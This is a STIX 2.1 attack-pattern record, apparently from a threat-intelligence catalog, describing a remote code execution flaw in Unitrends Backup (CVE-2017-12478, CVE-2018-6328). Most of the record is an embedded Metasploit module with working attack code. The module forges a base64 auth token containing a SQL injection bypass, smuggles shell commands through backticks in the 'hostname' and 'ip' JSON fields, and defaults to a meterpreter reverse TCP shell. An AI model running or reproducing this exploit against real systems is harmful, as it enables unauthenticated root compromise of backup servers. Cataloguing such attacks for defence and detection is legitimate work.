{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--94d5a662-4cbc-4881-84d5-29a2229c051f",
    "created": "2024-08-14T17:00:28.993137Z",
    "modified": "2024-08-14T17:00:28.993141Z",
    "name": "Unitrends UEB http api remote code execution",
    "description": " It was discovered that the api/storage web interface in Unitrends Backup (UB) before 10.0.0 has an issue in which one of its input parameters was not validated. A remote attacker could use this flaw to bypass authentication and execute arbitrary commands with root privilege on the target system. UEB v9 runs the api under root privileges and api/storage is vulnerable. UEB v10 runs the api under limited privileges and api/hosts is vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/ueb_api_rce.rb",
            "external_id": "ueb_api_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://support.unitrends.com/UnitrendsBackup/s/article/ka640000000TO5PAAW/000005756"
        },
        {
            "source_name": "reference",
            "url": "https://support.unitrends.com/UnitrendsBackup/s/article/000006002"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-12478"
        },
        {
            "source_name": "reference",
            "url": "http://blog.redactedsec.net/exploits/2018/01/29/UEB9.html"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-12478"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-6328"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Unitrends UEB http api remote code execution',\n      'Description'    => %q{\n        It was discovered that the api/storage web interface in Unitrends Backup (UB)\n        before 10.0.0 has an issue in which one of its input parameters was not validated.\n        A remote attacker could use this flaw to bypass authentication and execute arbitrary\n        commands with root privilege on the target system.\n        UEB v9 runs the api under root privileges and api/storage is vulnerable.\n        UEB v10 runs the api under limited privileges and api/hosts is vulnerable.\n      },\n      'Author'         =>\n        [\n          'Cale Smith',    # @0xC413\n          'Benny Husted', # @BennyHusted\n          'Jared Arave',   # @iotennui\n          'h00die'\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'linux',\n      'Arch' => [ARCH_X86],\n      'CmdStagerFlavor' => [ 'printf' ],\n      'References'     =>\n        [\n          ['URL', 'https://support.unitrends.com/UnitrendsBackup/s/article/ka640000000TO5PAAW/000005756'],\n          ['URL', 'https://support.unitrends.com/UnitrendsBackup/s/article/000006002'],\n          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2017-12478'],\n          ['URL', 'http://blog.redactedsec.net/exploits/2018/01/29/UEB9.html'],\n          ['EDB', '44297'],\n          ['CVE', '2017-12478'],\n          ['CVE', '2018-6328']\n        ],\n      'Targets'        =>\n        [\n          [ 'UEB 9.*', { 'Privileged' => true} ],\n          [ 'UEB < 10.1.0', { 'Privileged' => false} ]\n        ],\n      'DefaultOptions' => {\n          'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp',\n          'SSL' => true\n        },\n      'DisclosureDate'  => '2017-08-08',\n      'DefaultTarget'   => 0))\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Use SSL', true])\n      ])\n    deregister_options('SRVHOST', 'SRVPORT')\n  end\n\n  def auth_token\n    session = \"v0:b' UNION SELECT -1 -- :1:/usr/bp/logs.dir/gui_root.log:0\"  #SQLi auth bypass\n    Base64.strict_encode64(session) #b64 encode session token\n  end\n\n  def check\n    res = send_request_cgi!({\n        'method' => 'GET',\n        'uri'    => '/api/systems/details',\n        'ctype'  => 'application/json',\n        'headers' =>\n        {'AuthToken' => auth_token}\n      })\n    if res && res.code == 200\n      print_good(\"Good news, looks like a vulnerable version of UEB.\")\n      return CheckCode::Appears\n    else\n      print_bad('Host does not appear to be vulnerable.')\n    end\n    return CheckCode::Safe\n  end\n\n  #substitue some charactes\n  def filter_bad_chars(cmd)\n    cmd.gsub!(\"\\\\\", \"\\\\\\\\\\\\\")\n    cmd.gsub!(\"'\", '\\\\\"')\n  end\n\n  def execute_command(cmd, opts = {})\n    if target.name == 'UEB 9.*'\n      #substitue the cmd into the hostname parameter\n      parms = %Q|{\"type\":4,\"name\":\"_Stateless\",\"usage\":\"stateless\",\"build_filesystem\":1,\"properties\":{\"username\":\"aaaa\",\"password\":\"aaaa\",\"hostname\":\"`|\n      parms << filter_bad_chars(cmd)\n      parms << %Q|` &\",\"port\":\"2049\",\"protocol\":\"nfs\",\"share_name\":\"aaa\"}}|\n      uri = '/api/storage'\n    elsif target.name == 'UEB < 10.1.0'\n      parms = %Q|{\"name\":\"ffff\",\"ip\":\"10.0.0.200'\\\\\"`0&|\n      parms << filter_bad_chars(cmd)\n      parms << %Q|`'\"}|\n      uri = '/api/hosts'\n    end\n\n    res = send_request_cgi({\n      'uri' => uri,\n      'method' => 'POST',\n      'ctype'  => 'application/json',\n      'encode_params' => false,\n      'data'   => parms,\n      'headers' =>\n        {'AuthToken' => auth_token}\n    })\n\n    if res && res.code != 500\n      fail_with(Failure::UnexpectedReply,'Unexpected response')\n    end\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n  end\n\n  def exploit\n    print_status(\"#{peer} - Sending requests to UEB...\")\n    execute_cmdstager(:linemax => 120)\n  end\n\n  def on_new_session(session)\n    if target.name == 'UEB < 10.1.0'\n      print_good(\"A privilege escalation exploit can be found 'exploits/linux/local/ueb_bpserverd_privesc'\")\n    end\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2017-08-08",
    "x_mitre_platforms": [
        "linux'"
    ]
}